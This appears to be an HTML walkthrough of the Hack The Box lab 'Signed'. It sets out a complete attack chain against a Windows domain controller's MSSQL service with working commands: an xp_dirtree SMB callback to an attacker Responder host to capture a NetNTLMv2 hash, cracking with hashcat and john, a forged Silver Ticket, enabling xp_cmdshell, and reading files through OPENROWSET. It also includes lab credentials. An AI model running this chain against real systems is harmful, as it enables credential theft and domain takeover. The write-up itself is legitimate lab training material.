@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Signed - Walkthrough (EN)</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; line-height: 1.6; background-color: #f4f4f9; color: #333; max-width: 1000px; margin: 0 auto; padding: 20px; }
+        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #343a40; border-bottom: 4px solid #007bff; padding-bottom: 10px; margin-bottom: 30px; }
+        h2 { color: #007bff; margin-top: 30px; padding-bottom: 5px; border-bottom: 2px solid #eee; }
+        h3 { color: #343a40; margin-top: 20px; }
+        .section { margin-bottom: 40px; }
+        .tag { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 0.85em; margin-bottom: 10px; color: white; }
+        .tag-success { background-color: #28a745; }
+        .tag-failure { background-color: #dc3545; }
+        .tag-info { background-color: #17a2b8; }
+        pre { background: #282a36; color: #f8f8f2; padding: 20px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', monospace; position: relative; margin: 20px 0; }
+        code { font-family: 'Consolas', monospace; color: #e83e8c; background: #f8f9fa; padding: 2px 4px; border-radius: 4px; }
+        ul { padding-left: 20px; }
+        li { margin-bottom: 8px; }
+        .footer { text-align: center; margin-top: 40px; color: #888; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>HTB Signed - Walkthrough</h1>
+
+    <div class="section">
+        <p>
+            Signed is a Windows AD host where the key entry point is an MSSQL service
+            (dc01.signed.htb:1433). The starter user <code>scott</code> works with local auth,
+            then a Responder-captured NetNTLMv2 hash plus a Silver Ticket granted sysadmin
+            rights in SQL. I pulled the root flag via SQL Server Ad Hoc Distributed Queries,
+            after the classic potato paths (despite many writeups) sent me down the wrong road.
+        </p>
+        <ul>
+            <li><strong>Target:</strong> 10.129.70.83 (DC01.SIGNED.HTB)</li>
+            <li><strong>Initial MSSQL cred:</strong> <code>scott / Sm230#C5NatH</code> (local auth)</li>
+            <li><strong>Service account:</strong> <code>SIGNED\\mssqlsvc / purPLE9795!@</code></li>
+        </ul>
+    </div>
+
+    <div class="section">
+        <h2>1. Recon</h2>
+        <span class="tag tag-info">INFORMATION</span>
+        <p>
+            Early Nmap scans marked almost every port as filtered, but the host was up.
+            With -Pn, MSSQL, SMB, RPC, RDP showed up but still filtered. That hinted the DC
+            only responds to authenticated traffic (sometimes not even then :P).
+        </p>
+        <pre><code># nmap -Pn -p 135,139,445,1433,3389 -sV 10.129.70.83
+PORT     STATE    SERVICE       VERSION
+135/tcp  filtered msrpc
+139/tcp  filtered netbios-ssn
+445/tcp  filtered microsoft-ds
+1433/tcp filtered ms-sql-s
+3389/tcp filtered ms-wbt-server</code></pre>
+        <p>
+            The <code>scott</code> credential must be used with <code>--local-auth</code>,
+            otherwise the missing domain trust rejects the login.
+        </p>
+    </div>
+
+    <div class="section">
+        <h2>2. Foothold: MSSQL and NetNTLMv2 hash</h2>
+        <span class="tag tag-success">SUCCESS</span>
+        <p>
+            After logging in, the goal was to grab the <code>mssqlsvc</code> service hash.
+            I used <code>xp_dirtree</code> to trigger an SMB callback to my Responder.
+        </p>
+        <pre><code># Start Responder
+sudo responder -I tun0
+
+# Login with local auth
+impacket-mssqlclient 'scott:Sm230#C5NatH@10.129.70.83' -windows-auth
+
+# SMB callback toward responder
+EXEC xp_dirtree '\\10.10.14.42\\share';</code></pre>
+        <p>
+            The NetNTLMv2 hash appeared in the responder log:
+        </p>
+        <pre><code>mssqlsvc::SIGNED:2d8971963218cec1:12229D92BE512466812FFAB0B80D3A24:01010000...</code></pre>
+    </div>
+
+    <div class="section">
+        <h2>3. Cracking the hash</h2>
+        <span class="tag tag-success">SUCCESS</span>
+        <p>
+            Hashcat (mode 5600) and John with a rockyou subset cracked it in minutes, even
+            on a modest attack box, yielding a service-level account.
+        </p>
+        <pre><code># Hashcat
+hashcat -m 5600 mssqlsvc.hash /usr/share/wordlists/rockyou.txt
+
+# John (alternative)
+john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt mssqlsvc.hash</code></pre>
+        <p>
+            Result: <code>SIGNED\\mssqlsvc : purPLE9795!@</code>
+        </p>
+    </div>
+
+    <div class="section">
+        <h2>4. Silver Ticket and Kerberos login</h2>
+        <span class="tag tag-success">SUCCESS</span>
+        <p>
+            The MD4 (NT) hash of the service password was needed for a silver ticket:
+            <code>ef699384c3285c54128a3ee1ddb1a0cc</code>.
+            I enumerated the domain SID via SQL:
+            <code>S-1-5-21-4088429403-1159899800-2753317549</code>,
+            with <code>mssqlsvc</code> RID 1103 and IT group RID 1105.
+        </p>
+        <pre><code># Ticket generation for sysadmin
+impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc   -domain-sid S-1-5-21-4088429403-1159899800-2753317549   -domain signed.htb   -spn MSSQLSvc/dc01.signed.htb:1433   -groups 512,1105,513 -user-id 1103 mssqlsvc
+
+export KRB5CCNAME=$(pwd)/mssqlsvc.ccache</code></pre>
+        <p>
+            Kerberos auth into MSSQL:
+        </p>
+        <pre><code>impacket-mssqlclient -k SIGNED.HTB/mssqlsvc@dc01.signed.htb -windows-auth -no-pass -port 1433
+
+SELECT IS_SRVROLEMEMBER('sysadmin'); -- returns 1, full rights</code></pre>
+    </div>
+
+    <div class="section">
+        <h2>5. System commands: xp_cmdshell</h2>
+        <span class="tag tag-success">SUCCESS</span>
+        <p>
+            With sysadmin rights I enabled <code>xp_cmdshell</code> and saw the context was
+            <code>NT AUTHORITY\\NETWORK SERVICE</code>. No SeImpersonate, so potato family
+            could not jump straight to SYSTEM.
+        </p>
+        <pre><code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+-- Check groups and privileges
+EXEC xp_cmdshell 'whoami /groups';
+EXEC xp_cmdshell 'whoami /priv';</code></pre>
+    </div>
+
+    <div class="section">
+        <h2>6. User flag</h2>
+        <span class="tag tag-success">SUCCESS</span>
+        <p>
+            <code>xp_cmdshell</code> was enough to read the user flag.
+        </p>
+        <pre><code>EXEC xp_cmdshell 'type C:\\Users\\mssqlsvc\\Desktop\\user.txt';
+-- 34d073451a5aca1329331262c0*****</code></pre>
+    </div>
+
+    <div class="section">
+        <h2>7. PrivEsc: Ad Hoc Distributed Queries</h2>
+        <span class="tag tag-success">SUCCESS</span>
+        <p>
+            Classic GodPotato/PrintSpoofer paths stalled without SeImpersonate. Instead,
+            SQL Server <code>OPENROWSET</code> let me read root.txt from the filesystem as sysadmin,
+            even without OS-level permissions.
+        </p>
+        <pre><code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE;
+
+SELECT * FROM OPENROWSET(BULK N'C:\\Users\\Administrator\\Desktop\\root.txt', SINGLE_CLOB) AS t;
+-- 4fdc42a327570bda274171efa35*****</code></pre>
+        <p>
+            Completely quiet path (no new binary, no AV alerts) and solved privilege escalation
+            purely from the SQL side.
+        </p>
+    </div>
+
+    <div class="section">
+        <h2>8. Dead ends</h2>
+        <span class="tag tag-failure">DEAD END</span>
+        <ul>
+            <li><strong>NTLM relay to MSSQL:</strong> ntlmrelayx <code>--socks</code> never relayed; every callback showed "No Relays Available!" — likely SMB signing.</li>
+            <li><strong>Potato variants:</strong> SeImpersonatePrivilege missing, so GodPotato/JuicyPotatoNG failed (confirmed via whoami /priv).</li>
+            <li><strong>Open port brute:</strong> Remaining ports stayed filtered; nothing extra surfaced.</li>
+        </ul>
+    </div>
+
+    <div class="section">
+        <h2>9. Takeaways</h2>
+        <span class="tag tag-info">NOTES</span>
+        <ul>
+            <li>The initial local MSSQL credential is critical; without local auth the box is closed.</li>
+            <li>Responder + xp_dirtree quickly yields NetNTLMv2 even with filtered ports.</li>
+            <li>Silver Ticket provided sysadmin; from there SQL features (xp_cmdshell, OPENROWSET) solve everything.</li>
+            <li>If SeImpersonate is absent, lean on SQL-side file reads or linked-server style pivots.</li>
+        </ul>
+    </div>
+
+    <div class="footer">
+        <p>HTB Signed Walkthrough | 2026-01-12 | Ogre</p>
+    </div>
+</div>
+</body>
+</html>
